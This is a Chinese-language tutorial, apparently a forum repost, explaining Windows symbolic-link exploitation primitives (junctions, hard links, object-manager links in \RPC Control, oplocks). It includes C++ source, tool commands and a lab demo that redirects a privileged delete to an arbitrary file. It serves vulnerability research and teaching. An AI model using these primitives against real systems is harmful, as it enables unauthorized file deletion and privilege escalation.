# windows符号链接利用技术详解

> **来源**: https://forum.butian.net/share/3033  
> **文章ID**: 3033

---

前言
==

符号链接技术在近几年的提权漏洞中尤为常见，包括最新的CVE-2024-21111也是用到了这种手法。2015年google project zero安全研究员James Forshaw提供了这一方面研究成果的一系列文章：

1. [symlinks](https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html)
2. [hardlinks](https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html)
3. [NTPathConversion](https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html)
4. [DirCreate2FileRead](https://googleprojectzero.blogspot.com/2017/08/windows-exploitation-tricks-arbitrary.html)
5. [FileWrite2EoP](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
6. [AccessModeMismatch](https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html)

随着时间的更替，其中有的手法已经被微软缓解。本文的目的是对当前时间下这些技术的利用手法进行详细的说明，因为工具包在操作的时候其实也会对各种报错充满了不解，因此将本文每个工具的操作和原理进行详细讲解，为后续的漏洞分析做铺垫。

我这里提供编译好的本文相关工具包：<https://github.com/10cks/exploiting-symbolic-link-in-windows-Res>

p0tools目录中工具包含：

- BaitAndSwitch.exe // 设置机会锁与对象符号链接
- CreateDosDeviceSymlink.exe // 创建对象管理器符号链接
- CreateHardlink.exe // 创建硬链接
- CreateMountPoint.exe // 创建连接点
- CreateNativeSymlink.exe // 创建原生符号链接
- CreateNtfsSymlink.exe // 创建文件系统符号链接
- CreateObjectDirectory.exe
- CreateRegSymlink.exe // 创建注册表符号链接
- CreateSymlink.exe // 创建：连接点 + 对象管理器符号链接
- DeleteMountPoint.exe // 删除连接点
- DumpReparsePoint.exe
- SetOpLock.exe // 设置机会锁

下文的操作中将会结合上面的工具进行详细解释，可自行下载跟随本文进行操作。

创建文件系统符号链接（NTFS Symlinks）
=========================

在Windows中，创建的符号链接主要用于文件系统，符号链接表现得更像是文件系统中的快捷方式。

首先来查看创建符号链接所需要的权限：

`Ctrl+R`输入`secpol.msc`，导航到 `Local Policies -> User Rights Assignment`，找到并双击 `Create symbolic links`：

![](images/1715416699762-9abc6cf8-9a6d-4899-a366-6d1dee72dcad.png)

可以看到创建符号链接需要管理员权限，非管理员权限运行则会报错：

![](images/1715417340714-1dc652e0-46da-47fa-9c09-df5413d21958.png)

管理员权限下运行，创建<目录链接到目录>：

```php
.\CreateNtfsSymlink.exe -d C:\Users\root\Desktop\test01\Dir C:\Users\root\Desktop\test01\Other
```

![](images/1715659832057-139f549e-7990-48fa-bbd0-976bb6335643.png)

![](images/1715433204931-57d7f0a0-bcb3-4861-bb59-7d89d48678cb.png)

注意：其中Dir目录要提前建立好，并且要是空目录。假如我们在Other目录下有一个111.txt文件，则可以直接从Dir中读取内容：

![](images/1715433450300-7af1e965-c6d1-4f86-bd5e-f83d077d6a44.png)

除此之外，还可以创建<文件到文件>的符号链接：

```php
.\CreateNtfsSymlink.exe -r C:\Users\root\Desktop\test01\File_SymbolLink\demo_file_link.txt C:\Users\root\Desktop\test01\demo_file.txt
```

![](images/1715659950876-c3e168e8-c1de-45ee-ba27-1affa17b47c5.png)

![](images/1715496675460-6af146e4-336d-435f-8c4d-9af58ecaa04e.png)

创建注册表项符号链接（Registry Key Symbolic Links）
=======================================

<https://scorpiosoftware.net/2020/07/17/creating-registry-links/>

标准 Windows 注册表包含一些不是真正的键的键，而是指向其他键的符号链接。例如，键 `HKEY_LOCAL_MACHINE\System\CurrentControlSet` 是 `HKEY_LOCAL_MACHINE\System\ControlSet001` 的符号链接（在大多数情况下）。使用标准注册表编辑器 RegEdit.exe 时，符号链接看起来像普通键，因为它们充当链接的目标。下图显示了上述按键。它们看起来完全一样：

![](images/1715600387201-c87a9975-cd2d-4785-b8e0-7721a3334163.png)

注册表中还有其他几个现有的符号链接。来看另一个例子，配置单元 `HKEY_CURRENT_CONFIG` 是指向`HKLM\SYSTEM\CurrentControlSet\Hardware Profiles\Current`的符号链接。（HKLM 是 HKEY\_LOCAL\_MACHINE的意思）

![](images/1715600708271-78c44d0e-aae4-47a4-b708-435e23b1f1f1.png)

但如何自己创建这样的链接呢？ Microsoft 官方文档提供了有关如何执行此操作的部分详细信息，但是缺少使其工作的两个关键信息。

让我们看看是否可以创建一个符号链接。注册表符号链接的一个条件是：

1. 链接必须指向创建链接的同一配置单元内的某个位置。
2. 链接的目标应写入名为`SymbolicLinkValue`的值，并且它必须是绝对注册表路径。

我们将在 `HKEY_CURRENT_USER`中创建一个名为 DesktopColors 的符号链接，该链接指向 `HKEY_CURRENT_USER\Control Panel\Desktop\Colors`：

第一步：

创建密钥并将其指定为链接：

```php
HKEY hKey;
RegCreateKeyEx(HKEY_CURRENT_USER, L"DesktopColors", 0, nullptr,
    REG_OPTION_CREATE_LINK, KEY_WRITE, nullptr, &hKey, nullptr);
```

重要的部分是 REG\_OPTION\_CREATE\_LINK 标志，指示这应该是链接而不是标准密钥。 KEY\_WRITE 访问掩码也是必需的，因为我们即将设置链接的目标。

第二步：

关于”链接的目标应写入名为`SymbolicLinkValue`的值，并且它必须是绝对注册表路径”这一点，大家第一反应可能是`HKEY_CURRENT_USER`，或者是`HKCU`，实际上这两个都不是：

这里所需的“绝对路径”是本机注册表路径，在 RegEdit.exe 中不可见，这里下载使用我编译好的[RegEditX](https://github.com/10cks/exploiting-symbolic-link-in-windows-Res/tree/main/RegEditX)可以看到：

![](images/1715602992950-fd76746d-c8ab-425a-b965-58a27d512c49.png)

真实的注册表是windows内核看到的注册表，这里面没有`HKEY_CURRENT_USER`，有一个USER 键，其中存在子键，这些子键根据 SID 代表该计算机上的用户。这些大多在 `HKEY_USERS` 配置单元下的标准注册表中可见。所需的“绝对路径”是基于注册表的真实视图。下面是根据我（当前用户）的 SID 编写正确路径的代码：

![](images/1715606760288-fff11eb5-0088-4114-abb4-d225b35e82f4.png)

```php
WCHAR path[] = L"\\REGISTRY\\USER\\S-1-5-21-4099861355-3358530361-1466466590-1000\\Control Panel\\Desktop\\Colors";
RegSetValueEx(hKey, L"SymbolicLinkValue", 0, REG_LINK, (const BYTE*)path,
    wcslen(path) * sizeof(WCHAR));
```

删除目标注册表：

当我们尝试使用`RegEdit.exe`删除新创建的密钥，目标将被删除，而不是符号链接本身。

删除注册表符号链接：

标准 `RegDeleteKey` 和`RegDeleteKeyEx` API 无法删除链接。即使他们获得了用 `REG_OPTION_OPEN_LINK` 打开的密钥句柄，他们也会忽略它并前往目标。唯一有效的 API 是本机 `NtDeleteKey` 函数（`NtDll.Dll`中的函数）。首先，我们添加函数的声明和 NtDll 导入：

```php
extern "C" int NTAPI NtDeleteKey(HKEY);

#pragma comment(lib, "ntdll")
```

现在我们可以像这样删除链接键：

```php
HKEY hKey;
RegOpenKeyEx(HKEY_CURRENT_USER, L"DesktopColors", REG_OPTION_OPEN_LINK, 
    DELETE, &hKey);
NtDeleteKey(hKey);
```

最后一点， `RegCreateKeyEx` 无法打开现有的链接密钥，它只能创建一个。这与可以使用 `RegCreateKeyEx` 创建或打开的标准键形成对比。这意味着，如果您想更改现有链接的目标，则必须首先调用 `RegOpenKeyEx` （使用 `REG_OPTION_OPEN_LINK` ），然后进行更改（或删除链接键并重新创建它）。

完整代码如下：

```php
#include <windows.h>
#include <iostream>

// 声明 NtDeleteKey 函数
extern "C" NTSTATUS NTAPI NtDeleteKey(HKEY hKey);
#pragma comment(lib, "ntdll.lib")

int main()
{
    HKEY hKey;
    LONG result;

    // 创建一个注册表链接键
    result = RegCreateKeyEx(HKEY_CURRENT_USER, L"DesktopColors", 0, nullptr,
        REG_OPTION_CREATE_LINK, KEY_WRITE, nullptr, &hKey, nullptr);

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to create link. Error: " << result << std::endl;
        return 1;
    } else {
        std::wcerr << L"Successed to set link target." << std::endl;
    }

    // 设置链接的目标
    WCHAR path[] = L"\\REGISTRY\\USER\\S-1-5-21-4099861355-3358530361-1466466590-1000\\Control Panel\\Desktop\\Colors";
    result = RegSetValueEx(hKey, L"SymbolicLinkValue", 0, REG_LINK, 
        (const BYTE*)path, wcslen(path) * sizeof(WCHAR));

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to set link target. Error: " << result << std::endl;
        RegCloseKey(hKey);
        return 1;
    }

    // 关闭键，完成设置
    RegCloseKey(hKey);

    // 重新打开键，准备删除
    result = RegOpenKeyEx(HKEY_CURRENT_USER, L"DesktopColors", REG_OPTION_OPEN_LINK, 
        DELETE, &hKey);

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to open link for deletion. Error: " << result << std::endl;
        return 1;
    }

    // 删除链接键
    NTSTATUS status = NtDeleteKey(hKey);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"Failed to delete link key. Status: " << status << std::endl;
        RegCloseKey(hKey);
        return 1;
    }

    // 最终关闭句柄
    RegCloseKey(hKey);
    std::wcout << L"Link key successfully deleted." << std::endl;

    return 0;
}
```

使用工具包中的`RegSymlink\RegLink_create.exe`：

![](images/1715607686297-de18b58b-3bd4-420d-a373-4a72c36a27e8.png)

创建连接点（Junctions）
================

Junction是一项 NTFS 功能，允许将目录设置为文件系统的挂载点，就像 Unix 中的挂载点，但也可以设置为解析到另一个目录（在同一或另一个文件系统上）。出于我们的目的，我们可以将它们视为一种仅限目录的符号链接。

与创建符号链接不同的是，非管理员权限也可以创建连接点，在命令行下我们可以使用系统自带的`mklink`来创建连接点，如下操作：

```php
mklink /J C:\Users\root\Desktop\test01\SecDir C:\Users\root\Desktop\test01\Other
```

![](images/1715659688847-d262b01c-3e7a-48c6-b2d2-74ce8cd47c37.png)

在执行这个命令时有两个条件：

1. 其中SecDir在当前目录中应该不存在，等执行后会自动创建这个目录。
2. 要对Other目录具有写入的权限

查看是否具备写入的权限：

![](images/1715496995466-15395aaa-8b13-48ee-bd6c-da44e2bee254.png)

执行成功：

![](images/1715434229264-47638e85-3153-4ad0-9cb7-8091c6e9f9cc.png)

除了使用mklink，我们也可以调用API进行操作，`CreateMountPoint.exe`源码如下：

```php
#include "stdafx.h"
#include <CommonUtils.h>

int _tmain(int argc, _TCHAR* argv[])
{
    if (argc < 3)
    {
        printf("CreateMountPoint directory target [printname]\n");      
        return 1;
    }

    if (CreateDirectory(argv[1], nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS))
    {
        if (!ReparsePoint::CreateMountPoint(argv[1], argv[2], argc > 3 ? argv[3] : L""))
        {
            printf("Error creating mount point - %ls\n", GetErrorMessage().c_str());
        }       
    }
    else
    {
        printf("Error creating directory - %ls\n", GetErrorMessage().c_str());
    }

    return 0;
}
```

相比于使用mklink，调用API在被转换为连接点的目录（下图为target目录）存在时也可以正常操作，但是需要被转换的目录为空，不为空则报错：

![](images/1715561271246-e1df3b23-b5d7-474e-a822-4c13070fe9db.png)

为空时正常转换：

![](images/1715561607208-6c500f71-4ea4-4c37-abf8-12231d93c53a.png)

CreateMountPoint 代码如下：

```php
#include "stdafx.h"
#include <CommonUtils.h>

int _tmain(int argc, _TCHAR* argv[])
{
    if (argc < 3)
    {
        printf("CreateMountPoint directory target [printname]\n");      
        return 1;
    }

    if (CreateDirectory(argv[1], nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS))
    {
        if (!ReparsePoint::CreateMountPoint(argv[1], argv[2], argc > 3 ? argv[3] : L""))
        {
            printf("Error creating mount point - %ls\n", GetErrorMessage().c_str());
        }       
    }
    else
    {
        printf("Error creating directory - %ls\n", GetErrorMessage().c_str());
    }

    return 0;
}
```

`CreateMountPoint`指定的目录（Other）必须具备写入权限，并且该目录中不能包含内容，否则会如下报错：

![](images/1715497960871-78527243-c6dc-4d05-9c5b-ec44cd9471c7.png)

```php
CreateMountPoint.exe C:\Users\root\Desktop\test01\Other 111
```

1. `C:\Users\root\Desktop\test01\Other`：这个参数指定了要创建挂载点的目录路径。
2. 111：这个参数指定了挂载点指向的目标路径。此处我们设置一个无效路径，可以看即使路径无效也可以正常执行。

正常情况下，该程序的执行效果为：

```php
CreateMountPoint.exe C:\Users\root\Desktop\test01\CreateMountPointTest\symlink_dir C:\Users\root\Desktop\test01\CreateMountPointTest\target_dir
```

![](images/1715498514454-33e7546a-5ed1-48fc-acba-c7ab1fc1cc00.png)

与mklink的区别在于，mklink在symlink\_dir目录存在时，无法执行代码，但是我们代码中通过自己处理重分析点（reparse points）能够即使目录存在也可以正确转换为连接点：

```php
if (!ReparsePoint::CreateMountPoint(argv[1], argv[2], argc > 3 ? argv[3] : L""))
```

![](images/1715499306103-38bb603f-7b22-413b-a22f-e4e8735be7e6.png)

再一次强调：需要注意的是，要转换为连接点的目录（Symlink\_dir）必须具备写入权限，否则会失败：

![](images/1715500238841-c0c1691b-b638-4f85-a202-70e3dc1cbfd7.png)

现在我们先总结一下文件系统符号链接和连接点的区别：

文件系统符号链接 (NTFS Symlinks)：

符号链接可以指向任何类型的文件或目录。

它们在文件系统层面上更加灵活，可以跨卷工作，也可以链接到文件。

从 Windows Vista 开始，创建符号链接通常需要管理员权限，除非更改了本地安全策略，允许非管理员用户创建符号链接。

连接点 (Junctions)：

连接点仅用于**链接目录**，不能链接到文件。

它们主要用于同一卷内的目录链接，尽管实际上也可以跨卷使用。

创建连接点**不需要管理员权限**，普通用户就可以创建。

创建硬链接（Hard Links）
=================

非特权用户还可以创建硬链接，与 Unix 对应的硬链接一样，它将用作现有文件的附加路径。它不适用于目录或跨卷（对于硬链接来说实际上没有意义）。

同样，内置工具不允许您创建指向无写访问权限的文件的硬链接，但实际的系统调用允许您使用打开的文件进行读取。使用 symboliclink-testing-tools 中的 CreateHardLink 工具（或 Ruben Boonen 的 PowerShell 脚本）创建指向您无权写入权限的文件的硬链接。请注意，如果您没有文件的写入权限，您将无法删除创建的链接（就像您无法使用其原始路径删除文件一样）。

更新：在即将推出的 Windows 10 版本中，该技术正在得到缓解。

CreateHardLink 代码如下：

```php
#include "stdafx.h"

int _tmain(int argc, _TCHAR* argv[])
{
    if (argc < 3)
    {
        printf("CreateHardLink hardlink target\n");
        printf("Example: hello.txt goodbye.txt\n");
        return 1;
    }
    else
    {
        if (CreateNativeHardlink(argv[1], argv[2]))
        {
            printf("Done\n");
        }
        else
        {
            printf("Error creating hardlink: %ls\n", GetErrorMessage().c_str());
            return 1;
        }
    }

    return 0;
}
```

```php
#include "stdafx.h"
#include "CommonUtils.h"
#include "ntimports.h"
#include "typed_buffer.h"

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname)
{
    std::wstring full_linkname = BuildFullPath(linkname, true);
    size_t len = full_linkname.size() * sizeof(WCHAR);

    typed_buffer_ptr<FILE_LINK_INFORMATION> link_info(sizeof(FILE_LINK_INFORMATION) + len - sizeof(WCHAR));

    memcpy(&link_info->FileName[0], full_linkname.c_str(), len);
    link_info->ReplaceIfExists = TRUE;
    link_info->FileNameLength = len;

    std::wstring full_targetname = BuildFullPath(targetname, true);

    HANDLE hFile = OpenFileNative(full_targetname.c_str(), nullptr, MAXIMUM_ALLOWED, FILE_SHARE_READ, 0);
    if (hFile)
    {
        DEFINE_NTDLL(ZwSetInformationFile);
        IO_STATUS_BLOCK io_status = { 0 };

        NTSTATUS status = fZwSetInformationFile(hFile, &io_status, link_info, link_info.size(), FileLinkInformation);
        CloseHandle(hFile);
        if (NT_SUCCESS(status))
        {
            return true;
        }
        SetNtLastError(status);
    }

    return false;   
}
```

在`symlink_demo.txt`可写的情况下进行操作：

![](images/1715500662804-4ac26624-7d56-476f-a89e-1e75a0cd5d56.png)

现在这一利用方法已经得到了技术缓解，如果无写入权限则需要管理员权限下才能正确执行：

![](images/1715500367978-169532c6-e63f-4516-8ed4-850ed7c3d86d.png)

![](images/1715500423053-bee81bb6-1658-4858-a0f0-ecb0d6d0b5c0.png)

无写入权限时，则会被拒绝，测试版本为`10.0.19041 N/A Build 19041`：

![](images/1715500833536-5f71ea5f-21b1-4397-85ac-c03c0aa5be9b.png)

测试低版本的则在没有写入权限时仍可将指定的文件转为硬链接`10.0.17763 N/A Build 17763`：

![](images/1715504810506-63721cb3-8ef4-4149-a3f0-ca8ed405cb5d.png)

创建对象管理器符号链接（Object Manager symbolic links）
==========================================

前面我们学习了如何创建文件系统符号链接（NTFS Symlinks），知道创建符号链接需要在管理员权限下进行操作，那是否有普通用户权限下创建符号链接的可能呢？

答案是可以的，普通用户可以在windows的对象管理器中创建符号链接。那么什么是对象管理器呢？

在windows中，系统使用逻辑对象跟踪所有资源，每个资源都驻留在命名空间中进行分类。资源可以是物理设备、卷上的文件或文件夹、注册表项，甚至是正在运行的进程。表示资源的所有对象都具有 Object Type 属性和有关资源的其他元数据。对象管理器是一个共享资源，其中存在所有这些名称空间及其各自的资源，并且处理资源的所有子系统都必须通过对象管理器。我们可以通过使用Windows Object Explorer进行查看：

![](images/1715506043434-369fa29a-e2bf-4992-a695-58b2cd9bba5f.png)

比如我们的`C:\`目录就是通过对象管理器`GLOBAL??`命名空间中的符号链接来跳转到真实的目录中的：

![](images/1715505714714-b49e34a4-7b8f-4870-8c43-81eed2526434.png)

这个符号链接跳转到HarddiskVolume3：

![](images/1715505767503-773a8cd5-5714-4f28-a2dd-ff325e59334f.png)

HarddiskVolume3 是 Windows 操作系统中用来表示硬盘上的一个逻辑卷的标识符。在Windows的设备管理体系中，硬盘和其他存储设备被分为多个逻辑卷，每个卷可以被分配一个唯一的标识符，用于操作系统内部管理和访问。

那么我们如何使用普通用户在对象管理器中创建符号链接呢？

我们可以在`\RPC Control`命名空间来设置符号链接，查看权限可以看到任何用户都具有`Create Object`权限：

![](images/1715506336430-213fb4a0-65f9-432d-a433-a681b1daa017.png)

对比而言，`GLOBAL??`则需要管理员权限才行：

![](images/1715506432985-64ca70e8-7aa5-4d4c-b712-564a64a950e4.png)

创建符号链接，在Windows中创建符号链接通常使用 `CreateSymbolicLink` API，但这适用于文件系统符号链接。对于对象管理器命名空间中的对象（如这里说到的`\RPC Control`），需要使用更底层的 API —— `NtCreateSymbolicLinkObject`。

我们可以使用CreateSymlink来进行创建，CreateSymlink源码如下：

```php
#include "stdafx.h"
#include <FileSymlink.h>

int _tmain(int argc, _TCHAR* argv[])
{
    if (argc < 3)
    {
        printf("CreateSymlink [-p] symlink target [baseobjdir]\n");
        printf("Example: C:\\path\\file c:\\otherpath\\otherfile\n");       
    }
    else
    {
        bool permanent = false;
        int arg_start = 1;

        if (wcscmp(argv[1], L"-p") == 0)
        {
            permanent = true;
            arg_start = 2;
        }

        LPCWSTR symlink = argv[arg_start];
        LPCWSTR target = argv[arg_start + 1];
        LPCWSTR baseobjdir = nullptr;
        if (argc - arg_start > 2)
        {
            baseobjdir = argv[arg_start + 2];
        }

        FileSymlink sl(permanent);

        if (sl.CreateSymlink(symlink, target, baseobjdir))
        {
            if (!permanent)
            {
                DebugPrintf("Press ENTER to exit and delete the symlink\n");
                getc(stdin);                
            }
        }
        else
        {
            return 1;
        }
    }

    return 0;
}
```

其中使用的函数封装：

```php
#include "stdafx.h"
#include "CommonUtils.h"
#include "ntimports.h"

HANDLE CreateSymlink(HANDLE root, LPCWSTR linkname, LPCWSTR targetname)
{
    DEFINE_NTDLL(RtlInitUnicodeString);
    DEFINE_NTDLL(NtCreateSymbolicLinkObject);

    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING name;
    UNICODE_STRING target;

    fRtlInitUnicodeString(&name, linkname);
    fRtlInitUnicodeString(&target, targetname);

    InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, root, nullptr);   

    HANDLE hLink;

    NTSTATUS status = fNtCreateSymbolicLinkObject(&hLink, 
        SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &target);
    if (status == 0)
    {
        DebugPrintf("Opened Link %ls -> %ls: %p\n", linkname, targetname, hLink);
        return hLink;
    }
    else
    {
        SetLastError(NtStatusToDosError(status));
        return nullptr;
    }
}
```

执行：

```php
CreateSymlink.exe C:\Users\root\Desktop\test01\CreateSymlink\test_dir_symlink\symlink_file.txt C:\Users\root\Desktop\test01\CreateSymlink\test_dir_01\file.txt
```

![](images/1715656007668-04646b40-2ed3-4b18-af6c-71e4cca793bf.png)

查看文件内容：

![](images/1715656169988-adf89bf0-0277-43a6-a09c-e295588ab1ee.png)

可以看到此时不能通过`C:\Users\root\Desktop\test01\CreateSymlink\test_dir_symlink\symlink_file.txt`路径去访问`C:\Users\root\Desktop\test01\CreateSymlink\test_dir_symlink\file.txt`的文件内容，因为构造的是对象管理器符号链接。

任意文件删除：Junctions + Object Manager symbolic link
===============================================

上面我们说了文件到文件的符号链接需要使用管理员权限下进行操作的文件系统符号链接，有趣的是当连接点与对象管理器符号链接一起使用时，能在普通用户权限下做到管理员权限下才能做到的文件系统符号链接效果，下面我们来逐步实现。

新建出下面的目录结构：

```php
C:.
│   dont_delete.txt
│
└───sym_testing
    ├───target
    │       config.txt
    │
    └───test
                config.txt
```

下面我们来实现两个目标，现在假设有一个程序，例如杀毒软件，正在以高权限删除`test\config.txt`文件，我们来尝试：

1. 删除目标改为`target\config.txt`（不同目录下同名文件）
2. 删除目标改为`dont_delete.txt`（不同目录下不同名文件）

针对第一个，我们可以将test目录转换为连接点，代码如下：

```php
int main(int argc, const char* argv[])
{

    OFSTRUCT openstruct;
    HFILE openhandle;
    // empty the test folder first
    openhandle = OpenFile("C:\\Users\\root\\Desktop\\test01\\demo\\sym_testing\\test\\config.txt", &openstruct, 0x00000200);
    // C:\\Users\\root\\Desktop\\test01\\demo\\sym_testing\\test
    if (openhandle == HFILE_ERROR) {
        std::cout << "[+] Delete file fails \n";
    }
    else {
        std::cout << "[+] Delete file OK \n";
    }
    CloseHandle(&openstruct);

    if (!ReparsePoint::CreateMountPoint(L"C:\\Users\\root\\Desktop\\test01\\demo\\sym_testing\\test", L"C:\\Users\\root\\Desktop\\test01\\demo\\sym_testing\\target", L""))
    {
        printf("[+] Mounting failed \n");
    }
    else {
        std::cout << "Mount point created successfully\n";
    }
    return 0; 
}
```

![](images/1715666961842-46e27f63-95f5-4a2e-b818-432839f40369.png)

OpenFile 函数用于打开文件，其中 0x00000200（即 OF\_DELETE）表示打开文件后立即删除它，因为前文我们说了在创建连接点时被转换的目录中不能带文件。

这个操作等同于使用mklink：

```php
mklink /J C:\Users\root\Desktop\test01\demo\sym_testing\test C:\Users\root\Desktop\test01\demo\sym_testing\target
```

运行结果：

![](images/1715523069349-d619c0fc-4b98-41e4-9a15-8ddbf1cae528.png)

现在，如果删除`test\config.txt`，实际上`test\config.txt`和`target\config.txt`文件会一起被删除。

对于第二个目标，则难度更高，删除的是不同目录下的不同命文件，等同于任意文件删除。

我们我们需要创建 `dont_delete.txt` 到 `\\RPC Control`对象的符号链接。然后将 `\\RPC Control` 挂载到 `\test\`目录。

需要注意的是：`test`目录应该为空，并且目录需要具有可写权限。

![](images/1715667691041-a5b823ef-bbce-457b-b152-a2cc885a4141.png)

最终达到的效果是：删除`test\config.txt`文件的操作最终会删除`path\dont_delete.txt`文件。

核心代码为：

```php
HANDLE CreateSymlink(HANDLE root, LPCWSTR linkname, LPCWSTR targetname)
{
    DEFINE_NTDLL(RtlInitUnicodeString);
    DEFINE_NTDLL(NtCreateSymbolicLinkObject);

    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING name;
    UNICODE_STRING target;

    fRtlInitUnicodeString(&name, linkname);
    fRtlInitUnicodeString(&target, targetname);

    InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, root, nullptr);

    HANDLE hLink;

    NTSTATUS status = fNtCreateSymbolicLinkObject(&hLink,
    SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &target);
    if (status == 0)
    {
        DebugPrintf("Opened Link %ls -> %ls: %p\n", linkname, targetname, hLink);
        return hLink;
    }
    else
    {
        SetLastError(NtStatusToDosError(status));
        return nullptr;
    }
}

int main(int argc, const char* argv[])
{
    OFSTRUCT openstruct;
    HFILE openhandle;
    // empty the test folder first
    openhandle = OpenFile("C:\\Users\\root\\Desktop\\test01\\demo\\sym_testing\\test\\config.txt", &openstruct, 0x00000200);
    if (openhandle == HFILE_ERROR) {
        std::cout << "[+] Delete file fails \n";
    }
    CloseHandle(&openstruct);

    HANDLE hret = CreateSymlink(nullptr, L"\\RPC Control\\config.txt", L"\\??\\C:\\Users\\root\\Desktop\\test01\\demo\\sym_testing\\dont_delete.txt");
    if ((NULL) == hret || (hret == INVALID_HANDLE_VALUE))
    {
        printf("[-] Failed creating symlink index %d ", GetLastError());
        return 0;
    }
    else {
        std::cout << "Symbolic link created successfully\n";
    }

    if (!ReparsePoint::CreateMountPoint(L"C:\\Users\\root\\Desktop\\test01\\demo\\sym_testing\\test", L"\\RPC Control", L""))
    {
        printf("[+] Big Faiiilll \n");
    }
    else {
        std::cout << "Mount point created successfully\n";
    }
    return 0; 
}
```

`-> ??\C:\Users\root\Desktop\test01\demo\sym_testing\dont_delete.txt`

这部分指明 config.txt 符号链接指向的实际路径是 `C:\Users\root\Desktop\test01\demo\sym_testing\dont_delete.txt`。这里的`\??\`是一个在 NT 系统内部用来访问对象的路径前缀，用于转换为全局路径。

![](images/1715584966705-3ff2d7e7-d96d-4863-9dfe-e4669168c43b.png)使用`fsutil reparsepoint query`查询被转换为连接点的目录状态：

![](images/1715566001451-837c414f-e0e3-409b-8c83-9f7472aa8e6b.png)

输出显示 `C:\Users\root\Desktop\test01\demo\sym_testing\test` 是一个连接点，其目标指向 `\RPC Control`。

我们使用Windows Object Exporer可以从RPC Control中看到创建的对象管理器符号链接：

![](images/1715567642239-a0836c7a-9433-4a53-a3b3-19501309b56c.png)

如果使用p0工具进行操作的话，对应为：

```php
CreateDosDeviceSymlink.exe "\RPC Control\config.txt" "\??\C:\Users\root\Desktop\test01\demo\dont_delete.txt"
CreateMountPoint.exe "C:\Users\root\Desktop\test01\demo\sym_testing\test" "\RPC Control"    
```

在我们进行上述操作后，可以使用echo对dont\_delete.txt文件进行写入：

![](images/1715586611895-d4ccb2dc-bb34-47aa-9ea6-ebbf229f6d88.png)

需要注意的是：del 命令在处理通过挂载点和符号链接间接定位的文件时，路径解析会出现异常，无法获取文件句柄，属于正常现象。echo则不会出现这个问题：

![](images/1715586404437-39157df8-1270-42d9-a3a2-f0578fe91c48.png)

那么我们应该如何删除dont\_delete.txt文件呢？

在 PowerShell 中删除文件，可以使用 Remove-Item 命令。这个命令通常比传统的 cmd 命令行工具更加灵活和强大，特别是在处理复杂路径或符号链接的情况下：

```php
Remove-Item "C:\Users\root\Desktop\test01\demo\sym_testing\test\config.txt" -Force
```

执行后就可以看到`dont_delete.txt`文件被删除，达到了我们想要的任意文件删除的目的。

机会锁（Opportunistic locks）
========================

oplock是一种可以放置在文件上的锁，当其他进程想要访问该文件时，它可以被告知—同时延迟这些进程的访问，以便锁定进程可以在解除锁之前让文件处于适当的状态。oplocks最初是为通过SMB缓存客户端-服务器文件访问而设计的，可以通过调用文件句柄上的特定控制代码设置oplock。

我们可以通过锁定一个试图打开的文件或目录来轻松地赢得与进程的竞争。SetOpLock（在p0的工具包中）工具可以让你创建这些锁，并阻止对文件或目录的访问，直到按回车键释放锁。它能让我们在读、写和放行oplock之间进行选择。这对于利用 TOCTOU（Time-of-check to time-of-use） 错误很有用，因为可以通过锁定进程尝试打开的文件或目录来轻松赢得与进程的竞争。使用机会锁时有一个限制条件：我们不能精确地允许一次访问（一旦解除锁定，所有待处理的访问都会发生），并且它不适用于所有类型的访问（一般情况下是适用的）。

通过设置符号链接（如前所述）并在最终文件（符号链接的目标）上放置一个 oplock，我们可以在目标文件打开时更改符号链接（即使目标文件被锁定，但是符号链接不受影响）并使其指向另一个目标文件。

首先使用`SetOpLock.exe`来尝试文件被机会锁锁住的情况：

源码如下：

```php
#include "stdafx.h"

static FileOpLock* oplock = nullptr;
static bstr_t target_2;

// 当机会锁被触发时，调用此回调函数。函数运行结束时机会锁释放
void HandleOplock()
{
    DebugPrintf("OpLock triggered, hit ENTER to close oplock\n");
    getc(stdin);
}

int _tmain(int argc, _TCHAR* argv[])
{   
    if (argc < 2)
    {
        printf("Usage: SetOpLock target [rwdx]\n");
    printf("Share Mode:\n");
    printf("r - FILE_SHARE_READ\n");
    printf("w - FILE_SHARE_WRITE\n");
    printf("d - FILE_SHARE_DELETE\n");
    printf("x - Exclusive lock\n");
        return 1;
    }
    else
    {               
        LPCWSTR target = argv[1];
        LPCWSTR share_mode = argc > 2 ? argv[2] : L"";

        oplock = FileOpLock::CreateLock(target, share_mode, HandleOplock);
        if (oplock != nullptr)
        {
            // 如果创建锁成功，调用 WaitForLock(INFINITE) 阻塞等待机会锁被触发。
            oplock->WaitForLock(INFINITE);

            delete oplock;
        }           
        else
        {
            printf("Error creating oplock\n");
            return 1;
        }
    }

    return 0;
}
```

执行程序，文件被锁住，无法读取内容，回车后释放，可让读取操作继续执行。

```php
SetOpLock.exe C:\Users\root\Desktop\test01\SetOpLock\test.txt
```

![](images/1715648594695-b5f0ce00-1f74-44a5-b8a2-d077618ce611.png)

使用`BaitAndSwitch.exe`（这个程序有问题，有时候会无法运行，不知道什么情况，出现问题就重启一般就好了）：

命令格式如下：

```php
BaitAndSwitch c:\path\to\link target_1 target_2 [sharemode]
```

`c:\path\to\link`：这是创建的符号链接的路径。

`target_1`：当第一次触发文件访问时，符号链接指向的目标文件或目录。

`target_2`：当再次触发文件访问时，符号链接指向的第二个目标文件或目录。

